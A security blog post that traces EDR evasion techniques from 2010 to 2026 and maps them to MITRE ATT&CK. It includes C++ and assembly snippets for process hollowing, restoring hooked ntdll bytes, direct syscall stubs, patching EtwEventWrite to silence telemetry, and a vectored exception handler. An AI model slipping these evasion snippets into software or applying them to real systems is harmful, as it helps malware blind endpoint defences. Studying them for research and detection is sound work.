---
layout: attack
title: The EDR Bypass Roadmap: Technical Evolution & API Subversion
---

The battle for the endpoint is won or lost in the telemetry. This also has been realized by the community and folks like Kostas Tales are adressing this within projects like [EDR Telemetry](https://www.edr-telemetry.com/) to improve the telemetry of EDR products by comparrison. This timeline breaks down the evolution of evasion from simple API abuse to hardware-level subversion, mapped against the **MITRE ATT&CK®** framework and your research into [**Windows APIs**](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) and [**ETW (Event Tracing for Windows)**](https://benjitrapp.github.io/defenses/2024-02-11-etw/).


## Phase 1: The Foundation (2010–2015)
**Strategy:** Exploiting trust by utilizing legitimate Windows mechanisms for code placement.

- **Process Hollowing ([T1055.012](https://attack.mitre.org/techniques/T1055/012/))**  
  Hijacking a legitimate process by unmapping its code and replacing it with a malicious payload.

```cpp
// Example: Creating a suspended process for hollowing
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED,
    NULL, NULL,
    &si, &pi
);

// Unmapping the original image (Native API)
typedef NTSTATUS (NTAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);

_NtUnmapViewOfSection NtUnmapViewOfSection =
    (_NtUnmapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtUnmapViewOfSection"
    );

NtUnmapViewOfSection(pi.hProcess, pBaseAddress);
```
## Phase 2: The Hooking Wars (2015–2017)
**Strategy:** Detecting and removing userland sensors.

- **Manual Unhooking**  
  Attackers respond to EDR `JMP` patches by overwriting the hooked `.text` section with a clean copy of `ntdll.dll`.

```cpp
// Example: Overwriting ntdll hooks with a clean buffer
DWORD oldProtect;

VirtualProtect(pNtOpenProcess, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pNtOpenProcess, "\x4c\x8b\xd1\xb8\x26", 5); // Original bytes
VirtualProtect(pNtOpenProcess, 5, oldProtect, &oldProtect);
```
## Phase 3: The Syscall Revolution (2017–2019)
**Strategy:** Bypassing the hooked middleman (`ntdll.dll`) entirely.

- **Direct Syscalls ([T1106](https://attack.mitre.org/techniques/T1106/))**  
  Manually implementing syscall stubs in assembly to communicate directly with the kernel.

```asm
; Example: Syscall stub for NtAllocateVirtualMemory (x64)
public NtAllocateVirtualMemory

NtAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h    ; Syscall number for Win10 (example)
    syscall
    ret
NtAllocateVirtualMemory endp
```

## Phase 4: Indirect Syscalls & Stack Integrity (2019–2021)
**Strategy:** Executing syscalls from trusted memory locations to evade direct-syscall detections.

- **Indirect Syscalls**  
  Jumping to an existing `syscall` instruction inside `ntdll.dll` so the return address remains within legitimate code boundaries.

## Phase 5: The ETW & Memory Evasion Era (2020–2022)
**Strategy:** Blinding sensors and abusing telemetry pipelines.

As EDRs moved beyond hooks and began relying on [**ETW**](https://benjitrapp.github.io/defenses/2024-02-11-etw/), attackers developed [**Offensive ETW**](https://benjitrapp.github.io/attacks/2024-02-11-offensive-etw/) patching techniques.

- **ETW Patching ([T1562.006](https://attack.mitre.org/techniques/T1562/006/))**  
  Patching `EtwEventWrite` with a `RET` instruction to prevent event emission.

```cpp
// Example: Silencing ETW telemetry
void PatchETW() {
    void* pEventWrite =
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    DWORD old;
    VirtualProtect(pEventWrite, 1, PAGE_EXECUTE_READWRITE, &old);
    *(BYTE*)pEventWrite = 0xC3; // RET
    VirtualProtect(pEventWrite, 1, old, &old);
}
```

## Phase 6: Advanced Injection & Modern Era (2022–Present / Timee of Writing 2026)
**Strategy:** Subverting kernel callbacks and abusing execution artifacts.

- **Vectored Exception Handling (VEH)**  
  Intentionally triggering exceptions and executing logic from a trusted handler context.

```cpp
LONG WINAPI MyHandler(PEXCEPTION_POINTERS pExcpt) {
    if (pExcpt->ExceptionRecord->ExceptionCode == STATUS_BREAKPOINT) {
        pExcpt->ContextRecord->Rip++; // Skip breakpoint
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

AddVectoredExceptionHandler(1, MyHandler);
```

## Technical Summary & API Matrix

| Phase | Technique | API Cross-Reference | MITRE TID |
|------|----------|--------------------|-----------|
| **Foundation** | Process Hollowing | [Process APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) | T1055.012 |
| **Hooking** | DLL Unhooking | [Memory APIs](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) | T1055.001 |
| **Syscalls** | Direct / Indirect | `NtAllocateVirtualMemory` | T1106 |
| **Tracing** | **ETW Patching** | [ETW Internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/) | T1562.006 |
| **Modern** | VEH Bypasses | `AddVectoredExceptionHandler` | T1562.001 |


## Conclusion
The arms race is relentless. To stay ahead, offensive researchers must master three domains:
1.  **Fundamental API Knowledge:** Understanding [how Windows functions work](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) at a low level.
2.  **Telemetry Awareness:** Understanding how defenders [utilize ETW](https://benjitrapp.github.io/defenses/2024-02-11-etw/) to monitor system behavior.
3.  **Adversarial Adaptation:** Applying [offensive ETW subversion](https://benjitrapp.github.io/attacks/2024-02-11-offensive-etw/) and modern syscall techniques to remain undetected.
